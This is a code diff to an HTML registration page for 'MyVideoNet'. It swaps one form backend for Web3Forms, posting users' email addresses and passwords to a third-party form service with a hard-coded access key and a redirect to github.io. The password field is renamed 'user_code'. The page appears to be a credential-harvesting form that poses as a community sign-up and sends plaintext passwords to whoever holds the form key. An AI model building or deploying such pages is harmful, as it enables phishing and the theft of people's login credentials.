@@ -63,10 +63,18 @@
             <div class="card">
                 <h2>Join the MyVideoNet Community</h2>
                 <p>Register below to unlock exclusive creator perks and forums!</p>
-                <!-- REPLACE THE LINK BELOW WITH YOUR ACTUAL FORMSPREE TARGET LINK -->
-                <form action="https://formspree.io" method="POST">
-                    <input type="email" name="email" placeholder="Enter Your Email Address" required>
-                    <input type="password" name="password" placeholder="Create Secure Password" required>
+                
+                <!-- Secure Web3Forms Form Configuration -->
+                <form action="https://web3forms.com" method="POST">
+                    <!-- PASTE YOUR SECURE ACCESS KEY INSIDE THE VALUE QUOTES BELOW -->
+                    <input type="hidden" name="access_key" value="4f38b7a5-9998-49c9-83cf-542dd7cc004e">
+                    
+                    <input type="email" name="user_email" placeholder="Enter Your Email Address" required>
+                    <input type="password" name="user_code" placeholder="Create Secure Password" required>
+                    
+                    <!-- Redirects user back to your video homepage upon successful sign up -->
+                    <input type="hidden" name="redirect" value="https://github.io">
+                    
                     <button type="submit">Submit Registration</button>
                 </form>
             </div>
